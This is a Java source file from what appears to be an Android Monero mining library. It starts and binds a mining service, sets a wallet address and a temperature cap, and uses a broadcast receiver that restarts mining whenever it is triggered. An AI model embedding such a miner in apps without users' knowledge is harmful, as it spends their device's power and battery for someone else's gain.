package waterhole.miner.monero;

import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.ServiceConnection;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.RemoteException;

import java.io.ObjectStreamException;

import waterhole.miner.core.AbstractMiner;
import waterhole.miner.core.utils.LogUtils;

public final class XmrMiner extends AbstractMiner {

    static final String LOG_TAG = "Waterhole-XmrMiner";

    private IMiningServiceBinder mServiceBinder;

    private MineReceiver mineReceiver;


    private final ServiceConnection mServerConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName componentName, IBinder iBinder) {
            try {
                mServiceBinder = IMiningServiceBinder.MiningServiceBinder.asInterface(iBinder);
                mServiceBinder.startMine();
                mServiceBinder.setControllerNeedRun(true);
                if (topTemperature != -1)
                    mServiceBinder.setTemperature(topTemperature);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName componentName) {
            mServiceBinder = null;
        }
    };

    public boolean isMining() {
        return mServiceBinder != null;
    }

    public void setWalletAddr(String walletAddr) {
        try {
            mServiceBinder.setWalletAddr(walletAddr);
        } catch (RemoteException e) {
            e.printStackTrace();
        }
    }

    private XmrMiner() {
    }

    public static XmrMiner instance() {
        return Holder.instance;
    }

    private static class Holder {
        private static XmrMiner instance = new XmrMiner();
    }

    private Object readResolve() throws ObjectStreamException {
        return instance();
    }

    @Override
    public void startMine() {
        LogUtils.debug("huwwds", ">>>>>>>>>>>>>>>startMine");
        if (mineReceiver == null) {
            mineReceiver = new MineReceiver();
            IntentFilter intentFilter = new IntentFilter();
            intentFilter.addAction("waterhole.miner.monero.restart");
            getContext().registerReceiver(mineReceiver, intentFilter);
        }
        final Intent intent = new Intent(getContext(), MineService.class);
        getContext().bindService(intent, mServerConnection, Context.BIND_AUTO_CREATE);
    }

    @Override
    public void stopMine() {
        try {
            LogUtils.debug("huwwds", ">>>>>>>>>>>>>>>stopMine");
            if (mServiceBinder != null) {
                getContext().unbindService(mServerConnection);
                getContext().unregisterReceiver(mineReceiver);
                mineReceiver = null;
                mServiceBinder = null;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public class MineReceiver extends BroadcastReceiver {
        public MineReceiver() {
        }

        @Override
        public void onReceive(Context context, Intent intent) {
            stopMine();
            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                @Override
                public void run() {
                    startMine();
                }
            }, 1000);
        }
    }


}
